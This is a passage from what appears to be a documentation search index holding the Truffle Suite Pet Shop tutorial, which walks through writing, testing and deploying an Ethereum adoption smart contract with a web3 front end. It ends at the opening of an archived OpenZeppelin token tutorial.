Ethereum blockchain. It can retrieve user accounts, send transactions, interact with smart contracts, and more. Remove the multi-line comment from within initWeb3 and replace it with the following: // Modern dapp browsers... if ( window . ethereum ) { App . web3Provider = window . ethereum ; try { // Request account access await window . ethereum . enable (); } catch ( error ) { // User denied account access... console . error ( \"User denied account access\" ) } } // Legacy dapp browsers... else if ( window . web3 ) { App . web3Provider = window . web3 . currentProvider ; } // If no injected web3 instance is detected, fall back to Ganache else { App . web3Provider = new Web3 . providers . HttpProvider ( 'http://localhost:7545' ); } web3 = new Web3 ( App . web3Provider ); Things to notice: First, we check if we are using modern dapp browsers or the more recent versions of MetaMask where an ethereum provider is injected into the window object. If so, we use it to create our web3 object, but we also need to explicitly request access to the accounts with ethereum.enable() . If the ethereum object does not exist, we then check for an injected web3 instance. If it exists, this indicates that we are using an older dapp browser (like Mist or an older version of MetaMask). If so, we get its provider and use it to create our web3 object. If no injected web3 instance is present, we create our web3 object based on our local provider. (This fallback is fine for development environments, but insecure and not suitable for production.) Instantiating the contract \u00b6 Now that we can interact with Ethereum via web3, we need to instantiate our smart contract so web3 knows where to find it and how it works. Truffle has a library to help with this called @truffle/contract . It keeps information about the contract in sync with migrations, so you don't need to change the contract's deployed address manually. Still in /src/js/app.js , remove the multi-line comment from within initContract and replace it with the following: $ . getJSON ( 'Adoption.json' , function ( data ) { // Get the necessary contract artifact file and instantiate it with @truffle/contract var AdoptionArtifact = data ; App . contracts . Adoption = TruffleContract ( AdoptionArtifact ); // Set the provider for our contract App . contracts . Adoption . setProvider ( App . web3Provider ); // Use our contract to retrieve and mark the adopted pets return App . markAdopted (); }); Things to notice: We first retrieve the artifact file for our smart contract. Artifacts are information about our contract such as its deployed address and Application Binary Interface (ABI) . The ABI is a JavaScript object defining how to interact with the contract including its variables, functions and their parameters. Once we have the artifacts in our callback, we pass them to TruffleContract() . This creates an instance of the contract we can interact with. With our contract instantiated, we set its web3 provider using the App.web3Provider value we stored earlier when setting up web3. We then call the app's markAdopted() function in case any pets are already adopted from a previous visit. We've encapsulated this in a separate function since we'll need to update the UI any time we make a change to the smart contract's data. Getting The Adopted Pets and Updating The UI \u00b6 Still in /src/js/app.js , remove the multi-line comment from markAdopted and replace it with the following: var adoptionInstance ; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; return adoptionInstance . getAdopters . call (); }). then ( function ( adopters ) { for ( i = 0 ; i < adopters . length ; i ++ ) { if ( adopters [ i ] !== '0x0000000000000000000000000000000000000000' ) { $ ( '.panel-pet' ). eq ( i ). find ( 'button' ). text ( 'Success' ). attr ( 'disabled' , true ); } } }). catch ( function ( err ) { console . log ( err . message ); }); Things to notice: We access the deployed Adoption contract, then call getAdopters() on that instance. We first declare the variable adoptionInstance outside of the smart contract calls so we can access the instance after initially retrieving it. Using call() allows us to read data from the blockchain without having to send a full transaction, meaning we won't have to spend any ether. After calling getAdopters() , we then loop through all of them, checking to see if an address is stored for each pet. Since the array contains address types, Ethereum initializes the array with 16 empty addresses. This is why we check for an empty address string rather than null or other falsey value. Once a petId with a corresponding address is found, we disable its adopt button and change the button text to \"Success\", so the user gets some feedback. Any errors are logged to the console. Handling the adopt() Function \u00b6 Still in /src/js/app.js , remove the multi-line comment from handleAdopt and replace it with the following: var adoptionInstance ; web3 . eth . getAccounts ( function ( error , accounts ) { if ( error ) { console . log ( error ); } var account = accounts [ 0 ]; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; // Execute adopt as a transaction by sending account return adoptionInstance . adopt ( petId , { from : account }); }). then ( function ( result ) { return App . markAdopted (); }). catch ( function ( err ) { console . log ( err . message ); }); }); Things to notice: We use web3 to get the user's accounts. In the callback after an error check, we then select the first account. From there, we get the deployed contract as we did above and store the instance in adoptionInstance . This time though, we're going to send a transaction instead of a call. Transactions require a \"from\" address and have an associated cost. This cost, paid in ether, is called gas . The gas cost is the fee for performing computation and/or storing data in a smart contract. We send the transaction by executing the adopt() function with both the pet's ID and an object containing the account address, which we stored earlier in account . The result of sending a transaction is the transaction object. If there are no errors, we proceed to call our markAdopted() function to sync the UI with our newly stored data. Interacting with the dapp in a browser \u00b6 Now we're ready to use our dapp! Installing and configuring MetaMask \u00b6 The easiest way to interact with our dapp in a browser is through MetaMask , a browser extension for both Chrome and Firefox. Install MetaMask in your browser. Once installed, a tab in your browser should open displaying the following: After clicking Getting Started , you should see the initial MetaMask screen. Click Import Wallet . Next, you should see a screen requesting anonymous analytics. Choose to decline or agree. In the box marked Wallet Seed , enter the mnemonic that is displayed in Ganache. **Warning**: Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Enter a password below that and click OK . If all goes well, MetaMask should display the following screen. Click All Done . Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . In the box titled \"New Network\" enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say http://127.0.0.1:7545 . Click the top-right X to close out of Settings and return to the Accounts page. Each account created by Ganache is given 100 ether. You'll notice it's slightly less on the first account because some gas was used when the contract itself was deployed and when the tests were run. Configuration is now complete. Installing and configuring lite-server \u00b6 We can now start a local web server and use the dapp. We're using the lite-server library to serve our static files. This shipped with the pet-shop Truffle Box, but let's take a look at how it works. Open bs-config.json in a text editor (in the project's root directory) and examine the contents: { \"server\" : { \"baseDir\" : [ \"./src\" , \"./build/contracts\" ] } } This tells lite-server which files to include in our base directory. We add the ./src directory for our website files and ./build/contracts directory for the contract artifacts. We've also added a dev command to the scripts object in the package.json file in the project's root directory. The scripts object allows us to alias console commands to a single npm command. In this case we're just doing a single command, but it's possible to have more complex configurations. Here's what yours should look like: \"scripts\" : { \"dev\" : \"lite-server\" , \"test\" : \"echo \\\"Error: no test specified\\\" && exit 1\" }, This tells npm to run our local install of lite-server when we execute npm run dev from the console. Using the dapp \u00b6 Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. A MetaMask pop-up should appear requesting your approval to allow Pete's Pet Shop to connect to your MetaMask wallet. Without explicit approval, you will be unable to interact with the dapp. Click Connect . To use the dapp, click the Adopt button on the pet of your choice. You'll be automatically prompted to approve the transaction by MetaMask. Click Submit to approve the transaction. You'll see the button next to the adopted pet change to say \"Success\" and become disabled, just as we specified, because the pet has now been adopted. Note : If the button doesn't automatically change to say \"Success\", refreshing the app in the browser should trigger it. And in MetaMask, you'll see the transaction listed: You'll also see the same transaction listed in Ganache under the \"Transactions\" section. Congratulations! You have taken a huge step to becoming a full-fledged dapp developer. For developing locally, you have all the tools you need to start making more advanced dapps. If you'd like to make your dapp live for others to use, stay tuned for our future tutorial on deploying to the Ropsten testnet.","title":"Truffle Suite"},{"location":"guides/pet-shop/index.html#background","text":"Pete Scandlon of Pete's Pet Shop is interested in using Ethereum as an efficient way to handle their pet adoptions. The store has space for 16 pets at a given time, and they already have a database of pets. As an initial proof of concept, Pete wants to see a dapp which associates an Ethereum address with a pet to be adopted. The website structure and styling will be supplied. Our job is to write the smart contract and front-end logic for its usage.","title":"Background"},{"location":"guides/pet-shop/index.html#setting-up-the-development-environment","text":"There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Git Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. We also will be using Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. You can download Ganache by navigating to http://truffleframework.com/ganache and clicking the \"Download\" button. Note : If you are developing in an environment without a graphical interface, you can also use Truffle Develop, Truffle's built-in personal blockchain, instead of Ganache. You will need to change some settings---such as the port the blockchain runs on---to adapt the tutorial for Truffle Develop.","title":"Setting up the development environment"},{"location":"guides/pet-shop/index.html#creating-a-truffle-project-using-a-truffle-box","text":"Truffle initializes in the current directory, so first create a directory in your development folder of choice and then moving inside it. mkdir pet-shop-tutorial cd pet-shop-tutorial We've created a special Truffle Box just for this tutorial called pet-shop , which includes the basic project structure as well as code for the user interface. Use the truffle unbox command to unpack this Truffle Box. truffle unbox pet-shop Note : Truffle can be initialized a few different ways. Another useful initialization command is `truffle init`, which creates an empty Truffle project with no example contracts included. For more information, please see the documentation on Creating a project .","title":"Creating a Truffle project using a Truffle Box"},{"location":"guides/pet-shop/index.html#directory-structure","text":"The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts truffle-config.js : Truffle configuration file The pet-shop Truffle Box has extra files and folders in it, but we won't worry about those just yet.","title":"Directory structure"},{"location":"guides/pet-shop/index.html#writing-the-smart-contract","text":"We'll start our dapp by writing the smart contract that acts as the back-end logic and storage. Create a new file named Adoption.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract Adoption { } Things to notice: The minimum version of Solidity required is noted at the top of the contract: pragma solidity ^0.5.0; . The pragma command means \" additional information that only the compiler cares about \", while the caret symbol (^) means \" the version indicated or higher \". Like JavaScript or PHP, statements are terminated with semicolons.","title":"Writing the smart contract"},{"location":"guides/pet-shop/index.html#variable-setup","text":"Solidity is a statically-typed language, meaning data types like strings, integers, and arrays must be defined. Solidity has a unique type called an address . Addresses are Ethereum addresses, stored as 20 byte values. Every account and smart contract on the Ethereum blockchain has an address and can send and receive Ether to and from this address. Add the following variable on the next line after contract Adoption { . address [ 16 ] public adopters ; Things to notice: We've defined a single variable: adopters . This is an array of Ethereum addresses. Arrays contain one type and can have a fixed or variable length. In this case the type is address and the length is 16 . You'll also notice adopters is public. Public variables have automatic getter methods, but in the case of arrays a key is required and will only return a single value. Later, we'll write a function to return the whole array for use in our UI.","title":"Variable setup"},{"location":"guides/pet-shop/index.html#your-first-function-adopting-a-pet","text":"Let's allow users to make adoption requests. Add the following function to the smart contract after the variable declaration we set up above. // Adopting a pet function adopt ( uint petId ) public returns ( uint ) { require ( petId >= 0 && petId <= 15 ); adopters [ petId ] = msg.sender ; return petId ; } Things to notice: In Solidity the types of both the function parameters and output must be specified. In this case we'll be taking in a petId (integer) and returning an integer. We are checking to make sure petId is in range of our adopters array. Arrays in Solidity are indexed from 0, so the ID value will need to be between 0 and 15. We use the require() statement to ensure the ID is within range. If the ID is in range, we then add the address that made the call to our adopters array. The address of the person or smart contract who called this function is denoted by msg.sender . Finally, we return the petId provided as a confirmation.","title":"Your first function: Adopting a pet"},{"location":"guides/pet-shop/index.html#your-second-function-retrieving-the-adopters","text":"As mentioned above, array getters return only a single value from a given key. Our UI needs to update all pet adoption statuses, but making 16 API calls is not ideal. So our next step is to write a function to return the entire array. Add the following getAdopters() function to the smart contract, after the adopt() function we added above: // Retrieving the adopters function getAdopters () public view returns ( address [ 16 ] memory ) { return adopters ; } Things to notice: Since adopters is already declared, we can simply return it. Be sure to specify the return type (in this case, the type for adopters ) as address[16] memory . memory gives the data location for the variable. The view keyword in the function declaration means that the function will not modify the state of the contract. Further information about the exact limits imposed by view is available here .","title":"Your second function: Retrieving the adopters"},{"location":"guides/pet-shop/index.html#compiling-and-migrating-the-smart-contract","text":"Now that we have written our smart contract, the next steps are to compile and migrate it.","title":"Compiling and migrating the smart contract"},{"location":"guides/pet-shop/index.html#compilation","text":"Solidity is a compiled language, meaning we need to compile our Solidity to bytecode for the Ethereum Virtual Machine (EVM) to execute. Think of it as translating our human-readable Solidity into something the EVM understands. In a terminal, make sure you are in the root of the directory that contains the dapp and type: truffle compile Note : If you're on Windows and encountering problems running this command, please see the documentation on resolving naming conflicts on Windows . You should see output similar to the following: Compiling your contracts... =========================== > Compiling ./contracts/Adoption.sol > Compiling ./contracts/Migrations.sol > Artifacts written to /Users/cruzmolina/Code/truffle-projects/metacoin/build/contracts > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang","title":"Compilation"},{"location":"guides/pet-shop/index.html#migration","text":"Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! A migration is a deployment script meant to alter the state of your application's contracts , moving it from one state to the next. For the first migration, you might just be deploying new code, but over time, other migrations might move data around or replace a contract with a new one. Note : Read more about migrations in the Truffle documentation . You'll see one JavaScript file already in the migrations/ directory: 1_initial_migration.js . This handles deploying the Migrations.sol contract to observe subsequent smart contract migrations, and ensures we don't double-migrate unchanged contracts in the future. Now we are ready to create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: var Adoption = artifacts . require ( \"Adoption\" ); module . exports = function ( deployer ) { deployer . deploy ( Adoption ); }; Before we can migrate our contract to the blockchain, we need to have a blockchain running. For this tutorial, we're going to use Ganache , a personal blockchain for Ethereum development you can use to deploy contracts, develop applications, and run tests. If you haven't already, download Ganache and double click the icon to launch the application. This will generate a blockchain running locally on port 7545. Note : Read more about Ganache in the Truffle documentation . Back in our terminal, migrate the contract to the blockchain. truffle migrate You should see output similar to the following: 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x3b558e9cdf1231d8ffb3445cb2f9fb01de9d0363e0b97a17f9517da318c2e5af > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 > account: 0x8d9606F90B6CA5D856A9f0867a82a645e2DfFf37 > balance: 99 .99430184 > gas used: 284908 > gas price: 20 gwei > value sent: 0 ETH > total cost: 0 .00569816 ETH > Saving migration to chain. > Saving artifacts ------------------------------------- > Total cost: 0 .00569816 ETH 2_deploy_contracts.js ===================== Deploying 'Adoption' ............................. ............................. You can see the migrations being executed in order, followed by some information related to each migration. (Your information will differ.) In Ganache, note that the state of the blockchain has changed. The blockchain now shows that the current block, previously 0 , is now 4 . In addition, while the first account originally had 100 ether, it is now lower, due to the transaction costs of migration. We'll talk more about transaction costs later. You've now written your first smart contract and deployed it to a locally running blockchain. It's time to interact with our smart contract now to make sure it does what we want.","title":"Migration"},{"location":"guides/pet-shop/index.html#testing-the-smart-contract-using-solidity","text":"Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Solidity. 1. Create a new file named `TestAdoption.sol` in the `test/` directory. 1. Add the following content to the `TestAdoption.sol` file: pragma solidity ^ 0.5.0 ; import \"truffle/Assert.sol\" ; import \"truffle/DeployedAddresses.sol\" ; import \"../contracts/Adoption.sol\" ; contract TestAdoption { // The address of the adoption contract to be tested Adoption adoption = Adoption ( DeployedAddresses . Adoption ()); // The id of the pet that will be used for testing uint expectedPetId = 8 ; //The expected owner of adopted pet is this contract address expectedAdopter = address ( this ); } We start the contract off with 3 imports: * `Assert.sol`: Gives us various assertions to use in our tests. In testing, **an assertion checks for things like equality, inequality or emptiness to return a pass/fail** from our test. [Here's a full list of the assertions included with Truffle](https://github.com/trufflesuite/truffle/blob/master/packages/resolver/solidity/Assert.sol). * `DeployedAddresses.sol`: When running tests, Truffle will deploy a fresh instance of the contract being tested to the blockchain. This smart contract gets the address of the deployed contract. * `Adoption`: The smart contract we want to test. Note : The first two imports are referring to global Truffle files, not a `truffle` directory. You should not see a `truffle` directory inside your `test/` directory. Then we define three contract-wide variables: * First, one containing the smart contract to be tested, calling the `DeployedAddresses` smart contract to get its address. * Second, the id of the pet that will be used to test the adoption functions. * Third, since the TestAdoption contract will be sending the transaction, we set the expected adopter address to **this**, a contract-wide variable that gets the current contract's address. ### Testing the adopt() function To test the `adopt()` function, recall that upon success it returns the given `petId`. We can ensure an ID was returned and that it's correct by comparing the return value of `adopt()` to the ID we passed in. 1. Add the following function within the `TestAdoption.sol` smart contract, after the declaration of `Adoption`: // Testing the adopt() function function testUserCanAdoptPet () public { uint returnedId = adoption . adopt ( expectedPetId ); Assert . equal ( returnedId , expectedPetId , \"Adoption of the expected pet should match what is returned.\" ); } Things to notice: * We call the smart contract we declared earlier with the ID of `expectedPetId`. * Finally, we pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `Assert.equal()`. ### Testing retrieval of a single pet's owner Remembering from above that public variables have automatic getter methods, we can retrieve the address stored by our adoption test above. Stored data will persist for the duration of our tests, so our adoption of pet `expectedPetId` above can be retrieved by other tests. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of a single pet's owner function testGetAdopterAddressByPetId () public { address adopter = adoption . adopters ( expectedPetId ); Assert . equal ( adopter , expectedAdopter , \"Owner of the expected pet should be this contract\" ); } After getting the adopter address stored by the adoption contract, we assert equality as we did above. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `TestAdoption.sol`. // Testing retrieval of all pet owners function testGetAdopterAddressByPetIdInArray () public { // Store adopters in memory rather than contract's storage address [ 16 ] memory adopters = adoption . getAdopters (); Assert . equal ( adopters [ expectedPetId ], expectedAdopter , \"Owner of the expected pet should be this contract\" ); } Note the **memory** attribute on `adopters`. The memory attribute tells Solidity to temporarily store the value in memory, rather than saving it to the contract's storage. Since `adopters` is an array, and we know from the first adoption test that we adopted pet `expectedPetId`, we compare the testing contracts address with location `expectedPetId` in the array.","title":"Testing the smart contract using Solidity"},{"location":"guides/pet-shop/index.html#testing-the-smart-contract-using-javascript","text":"Expand This Section Truffle is very flexible when it comes to smart contract testing, in that tests can be written either in JavaScript or Solidity. In this tutorial, we'll be writing our tests in Javascript using the Chai and Mocha libraries. 1. Create a new file named `testAdoption.test.js` in the `test/` directory. 2. Add the following content to the `testAdoption.test.js` file: const Adoption = artifacts.require(\"Adoption\"); contract(\"Adoption\", (accounts) => { let adoption; let expectedPetId; before(async () => { adoption = await Adoption.deployed(); }); describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); }); }); We start the contract by importing : * `Adoption`: The smart contract we want to test We begin our test by importing our `Adoption` contract using `artifacts.require`. **Note**: When writing this test, our callback function take the argument `accounts`. This provides us with the accounts available on the network when using this test. Then, we make use of the `before` to provide initial setups for the following: * Adopt a pet with id 8 and assign it to the first account within the test accounts on the network. * This function later is used to check whether the `petId: 8` has been adopted by `accounts[0]`. ### Testing the adopt function To test the `adopt` function, recall that upon success it returns the given `adopter`. We can ensure that the adopter based on given petID was returned and is compared with the `expectedAdopter` within the `adopt` function. 1. Add the following function within the `testAdoption.test.js` test file, after the declaration of `before` code block. describe(\"adopting a pet and retrieving account addresses\", async () => { before(\"adopt a pet using accounts[0]\", async () => { await adoption.adopt(8, { from: accounts[0] }); expectedAdopter = accounts[0]; }); it(\"can fetch the address of an owner by pet id\", async () => { const adopter = await adoption.adopters(8); assert.equal(adopter, expectedAdopter, \"The owner of the adopted pet should be the first account.\"); }); }); Things to notice: * We call smart contract method `adopters` to see what address adopted the pet with `petID` 8. * Truffle imports `Chai` for the user so we can use the `assert` functions. We pass the actual value, the expected value and a failure message (which gets printed to the console if the test does not pass) to `assert.equal()`. ### Testing retrieval of all pet owners Since arrays can only return a single value given a single key, we create our own getter for the entire array. 1. Add this function below the previously added function in `testAdoption.test.js`. it(\"can fetch the collection of all pet owners' addresses\", async () => { const adopters = await adoption.getAdopters(); assert.equal(adopters[8], expectedAdopter, \"The owner of the adopted pet should be in the collection.\"); }); Since adopters is an array, and we know from the first adoption test that we adopted the pet with `petId` 8, we are comparing the contract's address with the address that we expect to find.","title":"Testing the smart contract using JavaScript"},{"location":"guides/pet-shop/index.html#running-the-tests","text":"Back in the terminal, run the tests: truffle test If all the tests pass, you'll see console output similar to this: Using network 'development' . Compiling your contracts... =========================== > Compiling ./test/TestAdoption.sol > Artifacts written to /var/folders/z3/v0sd04ys11q2sh8tq38mz30c0000gn/T/test-11934-19747-g49sra.0ncrr > Compiled successfully using: - solc: 0 .5.0+commit.1d4f565a.Emscripten.clang TestAdoption \u2713 testUserCanAdoptPet ( 91ms ) \u2713 testGetAdopterAddressByPetId ( 70ms ) \u2713 testGetAdopterAddressByPetIdInArray ( 89ms ) 3 passing ( 670ms )","title":"Running the tests"},{"location":"guides/pet-shop/index.html#creating-a-user-interface-to-interact-with-the-smart-contract","text":"Now that we've created the smart contract, deployed it to our local test blockchain and confirmed we can interact with it via the console, it's time to create a UI so that Pete has something to use for his pet shop! Included with the pet-shop Truffle Box was code for the app's front-end. That code exists within the src/ directory. The front-end doesn't use a build system (webpack, grunt, etc.) to be as easy as possible to get started. The structure of the app is already there; we'll be filling in the functions which are unique to Ethereum. This way, you can take this knowledge and apply it to your own front-end development.","title":"Creating a user interface to interact with the smart contract"},{"location":"guides/pet-shop/index.html#instantiating-web3","text":"Open /src/js/app.js in a text editor. Examine the file. Note that there is a global App object to manage our application, load in the pet data in init() and then call the function initWeb3() . The web3 JavaScript library interacts with the Ethereum blockchain. It can retrieve user accounts, send transactions, interact with smart contracts, and more. Remove the multi-line comment from within initWeb3 and replace it with the following: // Modern dapp browsers... if ( window . ethereum ) { App . web3Provider = window . ethereum ; try { // Request account access await window . ethereum . enable (); } catch ( error ) { // User denied account access... console . error ( \"User denied account access\" ) } } // Legacy dapp browsers... else if ( window . web3 ) { App . web3Provider = window . web3 . currentProvider ; } // If no injected web3 instance is detected, fall back to Ganache else { App . web3Provider = new Web3 . providers . HttpProvider ( 'http://localhost:7545' ); } web3 = new Web3 ( App . web3Provider ); Things to notice: First, we check if we are using modern dapp browsers or the more recent versions of MetaMask where an ethereum provider is injected into the window object. If so, we use it to create our web3 object, but we also need to explicitly request access to the accounts with ethereum.enable() . If the ethereum object does not exist, we then check for an injected web3 instance. If it exists, this indicates that we are using an older dapp browser (like Mist or an older version of MetaMask). If so, we get its provider and use it to create our web3 object. If no injected web3 instance is present, we create our web3 object based on our local provider. (This fallback is fine for development environments, but insecure and not suitable for production.)","title":"Instantiating web3"},{"location":"guides/pet-shop/index.html#instantiating-the-contract","text":"Now that we can interact with Ethereum via web3, we need to instantiate our smart contract so web3 knows where to find it and how it works. Truffle has a library to help with this called @truffle/contract . It keeps information about the contract in sync with migrations, so you don't need to change the contract's deployed address manually. Still in /src/js/app.js , remove the multi-line comment from within initContract and replace it with the following: $ . getJSON ( 'Adoption.json' , function ( data ) { // Get the necessary contract artifact file and instantiate it with @truffle/contract var AdoptionArtifact = data ; App . contracts . Adoption = TruffleContract ( AdoptionArtifact ); // Set the provider for our contract App . contracts . Adoption . setProvider ( App . web3Provider ); // Use our contract to retrieve and mark the adopted pets return App . markAdopted (); }); Things to notice: We first retrieve the artifact file for our smart contract. Artifacts are information about our contract such as its deployed address and Application Binary Interface (ABI) . The ABI is a JavaScript object defining how to interact with the contract including its variables, functions and their parameters. Once we have the artifacts in our callback, we pass them to TruffleContract() . This creates an instance of the contract we can interact with. With our contract instantiated, we set its web3 provider using the App.web3Provider value we stored earlier when setting up web3. We then call the app's markAdopted() function in case any pets are already adopted from a previous visit. We've encapsulated this in a separate function since we'll need to update the UI any time we make a change to the smart contract's data.","title":"Instantiating the contract"},{"location":"guides/pet-shop/index.html#getting-the-adopted-pets-and-updating-the-ui","text":"Still in /src/js/app.js , remove the multi-line comment from markAdopted and replace it with the following: var adoptionInstance ; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; return adoptionInstance . getAdopters . call (); }). then ( function ( adopters ) { for ( i = 0 ; i < adopters . length ; i ++ ) { if ( adopters [ i ] !== '0x0000000000000000000000000000000000000000' ) { $ ( '.panel-pet' ). eq ( i ). find ( 'button' ). text ( 'Success' ). attr ( 'disabled' , true ); } } }). catch ( function ( err ) { console . log ( err . message ); }); Things to notice: We access the deployed Adoption contract, then call getAdopters() on that instance. We first declare the variable adoptionInstance outside of the smart contract calls so we can access the instance after initially retrieving it. Using call() allows us to read data from the blockchain without having to send a full transaction, meaning we won't have to spend any ether. After calling getAdopters() , we then loop through all of them, checking to see if an address is stored for each pet. Since the array contains address types, Ethereum initializes the array with 16 empty addresses. This is why we check for an empty address string rather than null or other falsey value. Once a petId with a corresponding address is found, we disable its adopt button and change the button text to \"Success\", so the user gets some feedback. Any errors are logged to the console.","title":"Getting The Adopted Pets and Updating The UI"},{"location":"guides/pet-shop/index.html#handling-the-adopt-function","text":"Still in /src/js/app.js , remove the multi-line comment from handleAdopt and replace it with the following: var adoptionInstance ; web3 . eth . getAccounts ( function ( error , accounts ) { if ( error ) { console . log ( error ); } var account = accounts [ 0 ]; App . contracts . Adoption . deployed (). then ( function ( instance ) { adoptionInstance = instance ; // Execute adopt as a transaction by sending account return adoptionInstance . adopt ( petId , { from : account }); }). then ( function ( result ) { return App . markAdopted (); }). catch ( function ( err ) { console . log ( err . message ); }); }); Things to notice: We use web3 to get the user's accounts. In the callback after an error check, we then select the first account. From there, we get the deployed contract as we did above and store the instance in adoptionInstance . This time though, we're going to send a transaction instead of a call. Transactions require a \"from\" address and have an associated cost. This cost, paid in ether, is called gas . The gas cost is the fee for performing computation and/or storing data in a smart contract. We send the transaction by executing the adopt() function with both the pet's ID and an object containing the account address, which we stored earlier in account . The result of sending a transaction is the transaction object. If there are no errors, we proceed to call our markAdopted() function to sync the UI with our newly stored data.","title":"Handling the adopt() Function"},{"location":"guides/pet-shop/index.html#interacting-with-the-dapp-in-a-browser","text":"Now we're ready to use our dapp!","title":"Interacting with the dapp in a browser"},{"location":"guides/pet-shop/index.html#installing-and-configuring-metamask","text":"The easiest way to interact with our dapp in a browser is through MetaMask , a browser extension for both Chrome and Firefox. Install MetaMask in your browser. Once installed, a tab in your browser should open displaying the following: After clicking Getting Started , you should see the initial MetaMask screen. Click Import Wallet . Next, you should see a screen requesting anonymous analytics. Choose to decline or agree. In the box marked Wallet Seed , enter the mnemonic that is displayed in Ganache. **Warning**: Do not use this mnemonic on the main Ethereum network (mainnet). If you send ETH to any account generated from this mnemonic, you will lose it all! Enter a password below that and click OK . If all goes well, MetaMask should display the following screen. Click All Done . Now we need to connect MetaMask to the blockchain created by Ganache. Click the menu that shows \"Main Network\" and select Custom RPC . In the box titled \"New Network\" enter http://127.0.0.1:7545 and click Save . The network name at the top will switch to say http://127.0.0.1:7545 . Click the top-right X to close out of Settings and return to the Accounts page. Each account created by Ganache is given 100 ether. You'll notice it's slightly less on the first account because some gas was used when the contract itself was deployed and when the tests were run. Configuration is now complete.","title":"Installing and configuring MetaMask"},{"location":"guides/pet-shop/index.html#installing-and-configuring-lite-server","text":"We can now start a local web server and use the dapp. We're using the lite-server library to serve our static files. This shipped with the pet-shop Truffle Box, but let's take a look at how it works. Open bs-config.json in a text editor (in the project's root directory) and examine the contents: { \"server\" : { \"baseDir\" : [ \"./src\" , \"./build/contracts\" ] } } This tells lite-server which files to include in our base directory. We add the ./src directory for our website files and ./build/contracts directory for the contract artifacts. We've also added a dev command to the scripts object in the package.json file in the project's root directory. The scripts object allows us to alias console commands to a single npm command. In this case we're just doing a single command, but it's possible to have more complex configurations. Here's what yours should look like: \"scripts\" : { \"dev\" : \"lite-server\" , \"test\" : \"echo \\\"Error: no test specified\\\" && exit 1\" }, This tells npm to run our local install of lite-server when we execute npm run dev from the console.","title":"Installing and configuring lite-server"},{"location":"guides/pet-shop/index.html#using-the-dapp","text":"Start the local web server: npm run dev The dev server will launch and automatically open a new browser tab containing your dapp. A MetaMask pop-up should appear requesting your approval to allow Pete's Pet Shop to connect to your MetaMask wallet. Without explicit approval, you will be unable to interact with the dapp. Click Connect . To use the dapp, click the Adopt button on the pet of your choice. You'll be automatically prompted to approve the transaction by MetaMask. Click Submit to approve the transaction. You'll see the button next to the adopted pet change to say \"Success\" and become disabled, just as we specified, because the pet has now been adopted. Note : If the button doesn't automatically change to say \"Success\", refreshing the app in the browser should trigger it. And in MetaMask, you'll see the transaction listed: You'll also see the same transaction listed in Ganache under the \"Transactions\" section. Congratulations! You have taken a huge step to becoming a full-fledged dapp developer. For developing locally, you have all the tools you need to start making more advanced dapps. If you'd like to make your dapp live for others to use, stay tuned for our future tutorial on deploying to the Ropsten testnet.","title":"Using the dapp"},{"location":"guides/robust-smart-contracts-with-openzeppelin/index.html","text":"Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Smart contracts deployed to the Ethereum mainnet can deal with real money, so having our Solidity code free from errors and highly secure is essential. Zeppelin Solutions , a smart contract auditing service, has recognized this need. Using their experience, they've put together a set of vetted smart contracts called OpenZeppelin . We can use and extend these contracts to create more secure dapps in less time. OpenZeppelin comes with a wide array of smart contracts for various important functions ( see them all here ), but today we'll be focusing on their token contracts. Specifically, we'll be extending their StandardToken.sol contract to create our own ERC20 -compliant token. Requirements \u00b6 This tutorial expects you to have some knowledge of Truffle, Ethereum, and Solidity. If you haven't gone through our Ethereum overview and our Pet Shop tutorial yet, those would be great places to start. For even more information, please see the following links: Truffle documentation Ethereum Solidity documentation We will primarily be using the command line for this tutorial, so please ensure you have basic familiarity with your operating system's terminal. Overview \u00b6 In this tutorial we will be covering: Unboxing the front-end application Creating the \"TutorialToken\" smart contract Compiling and deploying the smart contract Interacting with the new token Unboxing the front-end application \u00b6 In this tutorial, we are focusing on smart contract creation. To that end, we've created the front-end for you in the form of a Truffle Box. On a terminal, create a project directory and navigate to it: mkdir oz-workspace cd oz-workspace Unbox the tutorialtoken Truffle Box. This will give us our project template. truffle unbox tutorialtoken Next, we'll install OpenZeppelin. The most recent version of OpenZeppelin can be found as an npm package. npm install openzeppelin-solidity Creating the \"TutorialToken\" smart contract \u00b6 With our front-end taken care of, we can focus on the TutorialToken contract. In the contracts/ directory of your Truffle Box, create the file TutorialToken.sol and add the following contents: pragma solidity ^ 0.4.24 ; import \"openzeppelin-solidity/contracts/token/ERC20/ERC20.sol\" 